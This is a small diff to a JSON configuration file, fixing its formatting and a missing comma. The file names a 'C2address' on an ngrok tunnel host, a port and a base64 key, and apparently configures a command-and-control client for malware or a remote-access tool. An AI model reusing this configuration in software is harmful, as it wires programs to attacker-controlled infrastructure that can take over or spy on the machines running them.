@@ -1,6 +1,6 @@
 {
-    "Version":"1.0",
-    "C2address":"0.tcp.in.ngrok.io",
-    "C2port":10336
-    "Key":"JoEzWkK1S5RMHI4xBO2lWxEz9msfNQGO7d1ODikez1s="
+    "Version": "1.0",
+    "C2address": "0.tcp.in.ngrok.io",
+    "C2port": 10336,
+    "Key": "JoEzWkK1S5RMHI4xBO2lWxEz9msfNQGO7d1ODikez1s="
 }
